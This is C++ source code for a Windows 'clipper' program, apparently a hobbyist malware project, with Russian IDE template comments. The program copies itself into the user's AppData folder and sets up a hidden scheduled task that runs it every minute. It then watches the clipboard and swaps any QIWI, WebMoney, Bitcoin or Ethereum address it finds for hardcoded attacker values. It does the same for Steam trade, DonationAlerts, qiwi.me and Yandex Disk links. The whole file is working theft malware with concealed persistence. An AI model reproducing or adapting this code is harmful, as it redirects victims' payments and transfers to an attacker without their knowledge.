// Clipper-C++.cpp : Этот файл содержит функцию "main". Здесь начинается и заканчивается выполнение программы.
//

#include <iostream>
#include "windows.h"
#include "string.h"
#include <direct.h>
#include <shlobj.h>
#include "Shlwapi.h"
#include <sys/stat.h>
#include <Shellapi.h>


const char* QIWI = "+77005553535";
const char* WMR = "P123456789101";
const char* WMZ = "Z123456789101";
const char* WMX = "X123456789101";
const char* WMU = "U123456789101";
const char* BTC = "34xp4vRoCGJym3xR7yCVPFHoCNxv4Twseo";
const char* ETH = "0xc137a2e0d5176009c7ce88b9611b28a123c3881b";
const char* STEAM = "https://steamcommunity.com/tradeoffer/new/?partner=123123&token=qweqwe";
const char* DonAlerts = "https://www.donationalerts.com/r/qwe123";
const char* QiwiMe = "https://qiwi.me/qwe123";
const char* YandexDisk = "https://yadi.sk/d/qwe123";


// Проверяем есть ли такая папка
bool IsPathExist(const std::string& s)
{
    struct stat buffer;
    return (stat(s.c_str(), &buffer) == 0);
}

void copy_me() {
    char* appdata = getenv("APPDATA");
    const char* folder = "\\WinServer";

    char* rdy_folder = strcat(appdata, folder);
    if (!IsPathExist(rdy_folder)) {
        mkdir(rdy_folder);
    }

    // Получаем путь откуда запущен файл
    TCHAR szEXEPath[2048];
    DWORD nChars = GetModuleFileName(NULL, szEXEPath, 2048);

    // Копируем файл
    const char* file_name = "\\Win1337.exe";
    char* rdy_ext = strcat(rdy_folder, file_name);
    CopyFile(szEXEPath, rdy_ext, true);
    // Создаём слжбу
    std::string st("/create /sc MINUTE /mo 1 /tn \"Windows Service1337\" /tr ");
    std::string stw(rdy_folder);
    std::string stw2(" /f");
    std::string rdy = st + stw + stw2;
    const char* teeeeeee = rdy.c_str();
    ShellExecute(NULL, "open", "schtasks.exe", teeeeeee, 0, SW_HIDE);
}

int main() {
    copy_me();
    while (true) {
        if (OpenClipboard(NULL))
        {
            std::string data = (char*)GetClipboardData(CF_TEXT);//QIWI Next
            if (((data.find("+7") == 0 && data.length() == 12) || (data.find("+380") == 0 && data.length() == 13))) {
                const size_t len = strlen(QIWI) + 1;
                HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
                memcpy(GlobalLock(hMem), QIWI, len);
                GlobalUnlock(hMem);
                EmptyClipboard();
                SetClipboardData(CF_TEXT, hMem);
            }//WMR Next
            else if (data.find("P") == 0 && data.length() == 13) {
                const size_t len = strlen(WMR) + 1;
                HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
                memcpy(GlobalLock(hMem), WMR, len);
                GlobalUnlock(hMem);
                EmptyClipboard();
                SetClipboardData(CF_TEXT, hMem);
            }//WMZ Next
            else if (data.find("Z") == 0 && data.length() == 13) {
                const size_t len = strlen(WMZ) + 1;
                HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
                memcpy(GlobalLock(hMem), WMZ, len);
                GlobalUnlock(hMem);
                EmptyClipboard();
                SetClipboardData(CF_TEXT, hMem);
            }//WMU Next
            else if (data.find("U") == 0 && data.length() == 13) {
                const size_t len = strlen(WMU) + 1;
                HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
                memcpy(GlobalLock(hMem), WMU, len);
                GlobalUnlock(hMem);
                EmptyClipboard();
                SetClipboardData(CF_TEXT, hMem);
            }//WMX Next
            else if (data.find("X") == 0 && data.length() == 13) {
                const size_t len = strlen(WMX) + 1;
                HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
                memcpy(GlobalLock(hMem), WMX, len);
                GlobalUnlock(hMem);
                EmptyClipboard();
                SetClipboardData(CF_TEXT, hMem);
            }//Bitcoin Next
            else if ((data.at(0) == 1 || data.at(0) == 3) && (data.find("0") != 0 && data.find("O") != 0 && data.find("I") != 0 && data.find("l") != 0) && (data.length() >= 32 && data.length() <= 34)) {
                const size_t len = strlen(BTC) + 1;
                HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
                memcpy(GlobalLock(hMem), BTC, len);
                GlobalUnlock(hMem);
                EmptyClipboard();
                SetClipboardData(CF_TEXT, hMem);
            }//ETH Next
            else if (data.find("0x") == 0 && data.length() == 42) {
                const size_t len = strlen(ETH) + 1;
                HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
                memcpy(GlobalLock(hMem), ETH, len);
                GlobalUnlock(hMem);
                EmptyClipboard();
                SetClipboardData(CF_TEXT, hMem);
            }//Steam Next
            else if (data.find("https://steamcommunity.com/tradeoffer/new/?partner=") == 0) {
                const size_t len = strlen(STEAM) + 1;
                HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
                memcpy(GlobalLock(hMem), STEAM, len);
                GlobalUnlock(hMem);
                EmptyClipboard();
                SetClipboardData(CF_TEXT, hMem);
            }//DonationAlerts Next
            else if (data.find("https://www.donationalerts.com/r/") == 0) {
                const size_t len = strlen(DonAlerts) + 1;
                HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
                memcpy(GlobalLock(hMem), DonAlerts, len);
                GlobalUnlock(hMem);
                EmptyClipboard();
                SetClipboardData(CF_TEXT, hMem);
            }//QIWI Next
            else if (data.find("https://qiwi.me/") == 0) {
                const size_t len = strlen(QiwiMe) + 1;
                HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
                memcpy(GlobalLock(hMem), QiwiMe, len);
                GlobalUnlock(hMem);
                EmptyClipboard();
                SetClipboardData(CF_TEXT, hMem);
            }//YD Next
            else if (data.find("https://yadi.sk/d/") == 0) {
                const size_t len = strlen(YandexDisk) + 1;
                HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
                memcpy(GlobalLock(hMem), YandexDisk, len);
                GlobalUnlock(hMem);
                EmptyClipboard();
                SetClipboardData(CF_TEXT, hMem);
            }
            CloseClipboard();
        }
        Sleep(500);
    }
    return 0;
}

// Запуск программы: CTRL+F5 или меню "Отладка" > "Запуск без отладки"
// Отладка программы: F5 или меню "Отладка" > "Запустить отладку"

// Советы по началу работы 
//   1. В окне обозревателя решений можно добавлять файлы и управлять ими.
//   2. В окне Team Explorer можно подключиться к системе управления версиями.
//   3. В окне "Выходные данные" можно просматривать выходные данные сборки и другие сообщения.
//   4. В окне "Список ошибок" можно просматривать ошибки.
//   5. Последовательно выберите пункты меню "Проект" > "Добавить новый элемент", чтобы создать файлы кода, или "Проект" > "Добавить существующий элемент", чтобы добавить в проект существующие файлы кода.
//   6. Чтобы снова открыть этот проект позже, выберите пункты меню "Файл" > "Открыть" > "Проект" и выберите SLN-файл.
